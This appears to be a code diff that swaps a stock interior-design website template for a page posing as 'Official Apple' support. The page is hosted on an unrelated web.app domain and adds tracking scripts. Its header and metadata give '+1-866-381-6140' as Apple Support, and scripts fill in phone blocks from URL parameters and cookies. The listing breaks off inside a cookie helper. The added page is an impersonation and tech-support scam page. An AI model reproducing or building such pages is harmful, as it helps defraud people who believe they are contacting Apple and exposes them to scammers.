@@ -1,13 +1,8 @@
-<?php
-?>
-<!doctype html>
-<html lang="en">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-	<!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5039478,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -15,643 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039478&101" alt="free hit counter" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-	<!-- Required meta tags -->
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<link rel="icon" href="img/favicon.png" type="image/png">
-	<title>Loaft Interior</title>
-	<!-- Bootstrap CSS -->
-	<link rel="stylesheet" href="css/bootstrap.css">
-	<link rel="stylesheet" href="vendors/linericon/style.css">
-	<link rel="stylesheet" href="css/font-awesome.min.css">
-	<link rel="stylesheet" href="vendors/owl-carousel/owl.carousel.min.css">
-	<link rel="stylesheet" href="vendors/nice-select/css/nice-select.css">
-	<link rel="stylesheet" href="vendors/animate-css/animate.css">
-	<link rel="stylesheet" href="vendors/popup/magnific-popup.css">
-	<link rel="stylesheet" href="vendors/swiper/css/swiper.min.css">
-	<link rel="stylesheet" href="vendors/scroll/jquery.mCustomScrollbar.css">
-	<!-- main css -->
-	<link rel="stylesheet" href="css/style.css">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+
 </head>
 
 <body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-	<!-- ================Offcanvus Menu Area =================-->
-	<div class="side_menu">
-		<ul class="list menu_right">
-			<li>
-				<a href="index.html">Home</a>
-			</li>
-			<li>
-				<a href="about-us.html">About</a>
-			</li>
-			<li>
-				<a href="#">Works</a>
-				<ul class="list">
-					<li>
-						<a href="project.html">Project</a>
-					</li>
-					<li>
-						<a href="project-details.html">Project Details</a>
-					</li>
-				</ul>
-			</li>
-			<li>
-				<a href="service.html">Service</a>
-			</li>
-			<li>
-				<a href="#">Pages</a>
-				<ul class="list">
-					<li>
-						<a href="elements.html">Elements</a>
-					</li>
-				</ul>
-			</li>
-			<li>
-				<a href="#">Blog</a>
-				<ul class="list">
-					<li>
-						<a href="blog.html">Blog</a>
-					</li>
-					<li>
-						<a href="single-blog.html">Blog Details</a>
-					</li>
-				</ul>
-			</li>
-			<li>
-				<a href="contact.html">Contact</a>
-			</li>
-		</ul>
-	</div>
-	<!--================End Offcanvus Menu Area =================-->
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-	<!--================Canvus Menu Area =================-->
-	<div class="canvus_menu">
-		<div class="container">
-			<div class="float-right">
-				<div class="toggle_icon" title="Menu Bar">
-					<span></span>
-				</div>
-			</div>
-		</div>
-	</div>
-	<!--================End Canvus Menu Area =================-->
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-	<!--================ Start banner section =================-->
-	<section class="home-banner-area relative">
-		<div class="container-fluid p-0">
-			<div class="owl-carousel owl-banner">
-				<div class="row  d-flex align-items-center justify-content-center">
-					<div class="col-lg-12">
-						<a href="#" class="logo">
-							<img src="img/logo.png" alt="">
-						</a>
-					</div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
 
-					<div class="col-lg-8 header-left">
-						<div class="">
-							<img class="img-fluid w-100" src="img/banner/banner-img1.jpg" alt="">
-						</div>
-					</div>
-
-					<div class="header-right col-lg-4">
-						<h1>
-							Precise <br>
-							Concept design <br>
-							for Posh living
-						</h1>
-						<p class="pt-20">
-							If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You may
-							see some for as low as $.17 each. You may be saying to yourself,
-						</p>
-					</div>
-					<div class="col-lg-12">
-						<a href="#" class="main_btn">
-							Learn More About Precise Design
-							<img src="img/next.png" alt="">
-						</a>
-					</div>
-
-				</div>
-
-				<div class="row  d-flex align-items-center justify-content-center">
-					<div class="col-lg-12">
-						<a href="#" class="logo">
-							<img src="img/logo.png" alt="">
-						</a>
-					</div>
-
-					<div class="col-lg-8 header-left">
-						<div class="">
-							<img class="img-fluid w-100" src="img/banner/banner-img1.jpg" alt="">
-						</div>
-					</div>
-
-					<div class="header-right col-lg-4">
-						<h1>
-							Precise <br>
-							Concept design <br>
-							for Posh living
-						</h1>
-						<p class="pt-20">
-							If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You may
-							see some for as low as $.17 each. You may be saying to yourself,
-						</p>
-					</div>
-					<div class="col-lg-12">
-						<a href="#" class="main_btn">
-							Learn More About Precise Design
-							<img src="img/next.png" alt="">
-						</a>
-					</div>
-
-				</div>
-			</div>
-		</div>
-	</section>
-	<!--================ End banner section ================= -->
-
-	<!--================ Start Project Area =================-->
-	<section class="section_gap project-area">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-6 col-md-6">
-					<div class="main_title">
-						<h1>
-							We are <span>Loaft</span><br>
-							Here are some of Our <br>
-							<span>Latest Works</span>
-						</h1>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price.</p>
-						<img src="img/next.png" alt="">
-					</div>
-					<!-- single projects -->
-					<div class="single-project">
-						<img class="img-fluid" src="img/project/img1.jpg" alt="">
-						<div class="project-details">
-							<p>Smart Kitchen Setup</p>
-							<h4>Smart Kitchen Setup with <br>
-								Vintage Style</h4>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-					<!-- branding -->
-					<div class="row">
-						<div class="col-lg-12">
-							<div class="owl-carousel brand-carousel">
-								<!-- single-brand -->
-								<div class="single-brand-item d-table">
-									<div class="d-table-cell">
-										<img src="img/brands/1.png" alt="">
-									</div>
-								</div>
-								<!-- single-brand -->
-								<div class="single-brand-item d-table">
-									<div class="d-table-cell">
-										<img src="img/brands/2.png" alt="">
-									</div>
-								</div>
-								<!-- single-brand -->
-								<div class="single-brand-item d-table">
-									<div class="d-table-cell">
-										<img src="img/brands/3.png" alt="">
-									</div>
-								</div>
-								<!-- single-brand -->
-								<div class="single-brand-item d-table">
-									<div class="d-table-cell">
-										<img src="img/brands/2.png" alt="">
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-
-				<div class="col-lg-6 col-md-6">
-					<!-- single projects -->
-					<div class="single-project">
-						<img class="img-fluid" src="img/project/img2.jpg" alt="">
-						<div class="project-details">
-							<p>Smart Kitchen Setup</p>
-							<h4>Smart Kitchen Setup with <br>
-								Vintage Style</h4>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-					<!-- single projects -->
-					<div class="single-project">
-						<img class="img-fluid" src="img/project/img3.jpg" alt="">
-						<div class="project-details">
-							<p>Smart Kitchen Setup</p>
-							<h4>Smart Kitchen Setup with <br>
-								Vintage Style</h4>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!--================ End Project Area =================-->
-
-	<!--================ Start Service Area =================-->
-	<section class="service-area">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-5 col-md-6">
-					<div class="main_title">
-						<h1>
-							We are <span>Loaft</span><br>
-							Top Services That <br>
-							We Offers
-						</h1>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price.</p>
-						<img src="img/next.png" alt="">
-					</div>
-				</div>
-			</div>
-			<div class="row">
-				<div class="col-lg-6 col-md-6">
-					<div class="service-img">
-						<img class="img-fluid" src="img/project/service1.jpg" alt="">
-					</div>
-				</div>
-				<div class="col-lg-5 offset-lg-1 col-md-6">
-					<!-- single service -->
-					<div class="single-service">
-						<h4>Smart Kitchen Setup</h4>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You may
-							see some for as low as $.17 each. You may be saying to yourself.</p>
-						<a href="#" class="main_btn1">
-							View Details
-							<img src="img/cnext.png" alt="">
-						</a>
-					</div>
-					<!-- single service -->
-					<div class="single-service mr-left">
-						<h4>Smart Kitchen Setup</h4>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You may
-							see some for as low as $.17 each. You may be saying to yourself.</p>
-						<a href="#" class="main_btn1">
-							View Details
-							<img src="img/cnext.png" alt="">
-						</a>
-					</div>
-					<!-- single service -->
-					<div class="single-service">
-						<h4>Smart Kitchen Setup</h4>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You may
-							see some for as low as $.17 each. You may be saying to yourself.</p>
-						<a href="#" class="main_btn1">
-							View Details
-							<img src="img/cnext.png" alt="">
-						</a>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!--================ End Service Area =================-->
-
-	<!--================ Start Gallery Service Area =================-->
-	<section class="gallery-area section_gap">
-		<div class="container-fluid">
-			<div class="row">
-				<div class="col-lg-6 col-md-6 text-right">
-					<div class="main_title">
-						<h1>
-							We are <span>Loaft</span><br>
-							Top Services That <br>
-							We Offers
-						</h1>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price.</p>
-						<img src="img/next.png" alt="">
-					</div>
-					<div class="row">
-						<div class="col-lg-12">
-							<!-- single gallery -->
-							<div class="single-gallery">
-								<img class="img-fluid" src="img/project/gallery1.jpg" alt="">
-								<div class="light-box">
-									<a href="img/project/gallery1.jpg" class="img-popup">
-										<span class="lnr lnr-move"></span>
-									</a>
-								</div>
-							</div>
-						</div>
-						<div class="col-lg-8 offset-lg-4">
-							<!-- single gallery -->
-							<div class="single-gallery">
-								<img class="img-fluid" src="img/project/gallery3.jpg" alt="">
-								<div class="light-box">
-									<a href="img/project/gallery3.jpg" class="img-popup">
-										<span class="lnr lnr-move"></span>
-									</a>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-				<div class="col-lg-6 col-md-6 text-left">
-					<div class="row">
-						<div class="col-lg-8">
-							<!-- single gallery -->
-							<div class="single-gallery">
-								<img class="img-fluid" src="img/project/gallery2.jpg" alt="">
-								<div class="light-box">
-									<a href="img/project/gallery2.jpg" class="img-popup">
-										<span class="lnr lnr-move"></span>
-									</a>
-								</div>
-							</div>
-						</div>
-						<div class="col-lg-12">
-							<!-- single gallery -->
-							<div class="single-gallery">
-								<img class="img-fluid" src="img/project/gallery4.jpg" alt="">
-								<div class="light-box">
-									<a href="img/project/gallery4.jpg" class="img-popup">
-										<span class="lnr lnr-move"></span>
-									</a>
-								</div>
-							</div>
-							<div class="counter_area" id="project_counter">
-								<!-- single counter -->
-								<div class="single_counter">
-									<div class="thumb">
-										<img src="img/project/count1.png" alt="">
-									</div>
-									<div class="info-content">
-										<h4><span class="counter">1990</span></h4>
-										<p>Projects done</p>
-									</div>
-								</div>
-								<!-- single counter -->
-								<div class="single_counter">
-									<div class="thumb">
-										<img src="img/project/count2.png" alt="">
-									</div>
-									<div class="info-content">
-										<h4><span class="counter">50</span>+</h4>
-										<p>Expert Members</p>
-									</div>
-								</div>
-								<!-- single counter -->
-								<div class="single_counter">
-									<div class="thumb">
-										<img src="img/project/count3.png" alt="">
-									</div>
-									<div class="info-content">
-										<h4><span class="counter">25</span>+</h4>
-										<p>Achievements</p>
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!--================ End Gallery Service Area =================-->
-
-	<!--================ Start Testimonial Area =================-->
-	<section class="testimonial_area">
-		<div class="container">
-			<div class="row align-items-center">
-				<div class="col-lg-5">
-					<div class="main_title">
-						<h1>
-							We are <span>Loaft</span><br>
-							What Our Priority <br>
-							<span>Client’s Say</span>
-						</h1>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price.</p>
-						<img src="img/next.png" alt="">
-					</div>
-					<div class="owl-carousel active_testimonial">
-						<!-- single testi -->
-						<div class="single_testi">
-							<div class="quote">
-								<img class="img-fluid" src="img/quote.png" alt="">
-							</div>
-							<div class="testi_content">
-								<p class="black_text">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor
-									incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco
-									laboris nisi ut aliquip ex ea commodo consequat.</p>
-								<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et
-									dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation.</p>
-							</div>
-							<div class="testi_author">
-								<div class="thumb"><img src="img/testi-author.png" alt=""></div>
-								<div class="a-desc">
-									<h6>Marvel Maison</h6>
-									<p>Chief Executive, Amazon</p>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-				<div class="col-lg-6 offset-lg-1">
-					<div class="testi_img">
-						<img class="img-fluid" src="img/testi-img.jpg" alt="">
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-
-	<!--================ End Testimonial Area =================-->
-
-	<!--================ Start Blog Area =================-->
-	<section class="blog-area section_gap">
-		<div class="container">
-			<div class="row">
-				<div class="col-lg-6">
-					<!-- single-blog -->
-					<div class="single-blog">
-						<img class="img-fluid big-blog-img" src="img/blog/h-blog1.jpg" alt="">
-						<div class="blog-meta">
-							<img src="img/testi-author.png" alt="">
-							<h6>Marvel Maison</h6>
-							<p>on 29th Oct, 2018</p>
-							<p>121 Likes</p>
-							<p>05 Comments</p>
-						</div>
-						<div class="blog-details">
-							<h4>Smart Kitchen Setup</h4>
-							<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You
-								may see some for as low as $.17 each. You may be saying to yourself.</p>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-					<!-- single-blog -->
-					<div class="single-blog">
-						<img class="img-fluid big-blog-img" src="img/blog/h-blog3.jpg" alt="">
-						<div class="blog-meta">
-							<img src="img/testi-author.png" alt="">
-							<h6>Marvel Maison</h6>
-							<p>on 29th Oct, 2018</p>
-							<p>121 Likes</p>
-							<p>05 Comments</p>
-						</div>
-						<div class="blog-details">
-							<h4>Smart Kitchen Setup</h4>
-							<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You
-								may see some for as low as $.17 each. You may be saying to yourself.</p>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-				</div>
-				<div class="col-lg-6">
-					<div class="main_title">
-						<h1>
-							We are <span>Loaft</span><br>
-							A Glimpse from <br>
-							Our Latest <span>Blog</span>
-						</h1>
-						<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price.</p>
-						<img src="img/next.png" alt="">
-					</div>
-					<!-- single-blog -->
-					<div class="single-blog">
-						<img class="img-fluid big-blog-img" src="img/blog/h-blog2.jpg" alt="">
-						<div class="blog-meta">
-							<img src="img/testi-author.png" alt="">
-							<h6>Marvel Maison</h6>
-							<p>on 29th Oct, 2018</p>
-							<p>121 Likes</p>
-							<p>05 Comments</p>
-						</div>
-						<div class="blog-details">
-							<h4>Smart Kitchen Setup</h4>
-							<p>If you are looking at blank cassettes on the web, you may be very confused at the difference in price. You
-								may see some for as low as $.17 each. You may be saying to yourself.</p>
-							<a href="#" class="main_btn1">
-								View Details
-								<img src="img/cnext.png" alt="">
-							</a>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-		<div class="container-fluid">
-			<div class="row">
-				<div class="col-lg-6 offset-lg-6">
-					<div class="cta-area">
-						<div class="row align-items-center justify-content-between">
-							<div class="col-lg-7 col-md-7">
-								<h1>Join us today without <br>
-									any hesitation</h1>
-							</div>
-							<div class="col-lg-5 col-md-5">
-								<div class="cta-btn">
-									<a href="#" class="main_btn1">
-										Learn More
-										<img src="img/cnext.png" alt="">
-									</a>
-								</div>
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-	<!--================ End Blog Area =================-->
-
-	<!--================ start footer Area  =================-->
-	<footer class="footer_area section_gap">
-		<div class="container">
-			<div class="row footer_inner">
-				<div class="col-lg-5 col-sm-6">
-					<aside class="f_widget ab_widget">
-						<div class="f_title">
-							<h3>About Me</h3>
-						</div>
-						<p>Do you want to be even more successful? Learn to love learning and growth. The more effort you put into
-							improving your skills,</p>
-						<p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-					</aside>
-				</div>
-				<div class="col-lg-5 col-sm-6">
-					<aside class="f_widget news_widget">
-						<div class="f_title">
-							<h3>Newsletter</h3>
-						</div>
-						<p>Stay updated with our latest trends</p>
-						<div id="mc_embed_signup">
-							<form target="_blank" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01"
-							 method="get" class="subscribe_form relative">
-								<div class="input-group d-flex flex-row">
-									<input name="EMAIL" placeholder="Enter email address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Email Address '"
-									 required="" type="email">
-									<button class="btn sub-btn"><span class="lnr lnr-arrow-right"></span></button>
-								</div>
-								<div class="mt-10 info"></div>
-							</form>
-						</div>
-					</aside>
-				</div>
-				<div class="col-lg-2">
-					<aside class="f_widget social_widget">
-						<div class="f_title">
-							<h3>Follow Me</h3>
-						</div>
-						<p>Let us be social</p>
-						<ul class="list">
-							<li><a href="#"><i class="fa fa-facebook"></i></a></li>
-							<li><a href="#"><i class="fa fa-twitter"></i></a></li>
-							<li><a href="#"><i class="fa fa-dribbble"></i></a></li>
-							<li><a href="#"><i class="fa fa-behance"></i></a></li>
-						</ul>
-					</aside>
-				</div>
-			</div>
-		</div>
-	</footer>
-	<!--================ End footer Area  =================-->
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
 
-	<!-- Optional JavaScript -->
-	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
-	<script src="js/jquery-3.2.1.min.js"></script>
-	<script src="js/popper.js"></script>
-	<script src="js/bootstrap.min.js"></script>
-	<script src="js/stellar.js"></script>
-	<script src="vendors/nice-select/js/jquery.nice-select.min.js"></script>
-	<script src="vendors/isotope/imagesloaded.pkgd.min.js"></script>
-	<script src="vendors/isotope/isotope-min.js"></script>
-	<script src="vendors/owl-carousel/owl.carousel.min.js"></script>
-	<script src="js/jquery.ajaxchimp.min.js"></script>
-	<script src="vendors/counter-up/jquery.waypoints.min.js"></script>
-	<script src="vendors/counter-up/jquery.counterup.js"></script>
-	<script src="js/mail-script.js"></script>
-	<script src="vendors/popup/jquery.magnific-popup.min.js"></script>
-	<script src="vendors/swiper/js/swiper.min.js"></script>
-	<script src="vendors/scroll/jquery.mCustomScrollbar.js"></script>
-	<script src="js/theme.js"></script>
-</body>
 
-</html>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
